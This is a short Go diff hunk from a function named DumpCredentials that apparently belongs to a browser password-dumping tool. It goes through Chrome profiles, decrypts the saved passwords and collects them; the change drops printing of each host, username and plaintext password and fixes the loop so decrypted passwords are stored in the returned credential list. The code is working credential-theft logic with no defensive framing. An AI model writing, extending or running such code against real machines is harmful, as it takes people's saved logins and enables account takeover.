@@ -61,10 +61,8 @@ func (c Chrome) DumpCredentials() ([][]Credentials, error) {
 			continue
 		}
 
-		fmt.Printf("> %s\n", profile)
-		for _, creds := range credentials {
-			c.DecryptPassword(&creds.password)
-			fmt.Printf("\t| - %s ---> %s:%s\n", creds.loginUrl.Host, creds.username, string(creds.password))
+		for i := range credentials {
+			c.DecryptPassword(&credentials[i].Password)
 		}
 		dump = append(dump, credentials)
 	}
